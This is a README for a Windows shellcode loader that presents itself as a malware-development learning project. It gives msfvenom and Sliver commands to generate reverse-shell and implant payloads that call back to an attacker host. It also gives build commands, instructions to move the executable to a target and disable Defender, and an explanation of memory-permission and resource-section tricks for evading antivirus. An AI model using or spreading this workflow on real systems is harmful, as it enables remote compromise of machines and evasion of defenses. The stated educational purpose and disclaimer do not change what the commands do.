# 🔴 Shellcode Loader

A Windows shellcode loader for learning malware development fundamentals. This project demonstrates how to load and execute shellcode using Windows API functions.

## 📚 Learning Roadmap Progress

| Week | Topic | Status |
|------|-------|--------|
| 1 | Basic Shellcode Runner (VirtualAlloc, RtlMoveMemory, CreateThread) | ✅ |
| 2 | Memory Permissions (RW → RX with VirtualProtect) | ✅ |
| 3 | Resource Section Storage (.rsrc) | ✅ |
| 4 | Python Automation Builder | ⬜ |

---

## 📁 Project Structure

```
Loader/
├── loader.c          
├── loader_rsrc.c     
├── resource.h        # Resource ID definitions
├── resource.rc       # Resource script (embeds payload.bin)
├── payload.bin       # Your shellcode (msfvenom/Sliver)
└── README.md
```

---

## 🔧 Loaders

### 1. Resource Loader (`loader.c`)

Shellcode stored in `.rsrc` section of the PE file.

**Compilation:**
```bash
# Step 1: Compile resource script
x86_64-w64-mingw32-windres resource.rc -o resource.o

# Step 2: Compile and link
x86_64-w64-mingw32-gcc loader.c resource.o -o loader.exe -s
```

---

## 🧪 Usage

### Generate Shellcode (Kali)

```bash
# Metasploit reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o payload.bin

# Or Sliver implant
generate --mtls <IP> --save payload.bin --format shellcode
```

### Compile & Run

1. Place `payload.bin` in the Loader directory
2. Compile using commands above
3. Transfer `.exe` to Windows target
4. **Disable Windows Defender** (for testing)
5. Run the loader

---

## 📖 Theory

### Execution Flow

```
┌─────────────────────────────────────────┐
│ 1. VirtualAlloc(PAGE_READWRITE)         │  Allocate RW memory
│ 2. RtlMoveMemory()                      │  Copy shellcode
│ 3. VirtualProtect(PAGE_EXECUTE_READ)    │  Flip to RX
│ 4. CreateThread()                       │  Execute in new thread
│ 5. WaitForSingleObject()                │  Wait for shell
└─────────────────────────────────────────┘
```

### Why RW → RX?

Allocating `RWX` (Read-Write-Execute) memory is suspicious to antivirus. The "polite" approach:
1. Allocate as **RW** (normal, safe)
2. Write shellcode
3. Flip to **RX** (execute without write permission)

### Resource Section Benefits

- Separates loader logic from payload
- Easy payload swapping without recompiling C code
- Looks more legitimate (resources are normal)
- Foundation for encryption (decrypt at runtime)

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. Use only in authorized environments (your own VMs with Defender disabled). Unauthorized use against systems you don't own is illegal.

---

## 📝 License

MIT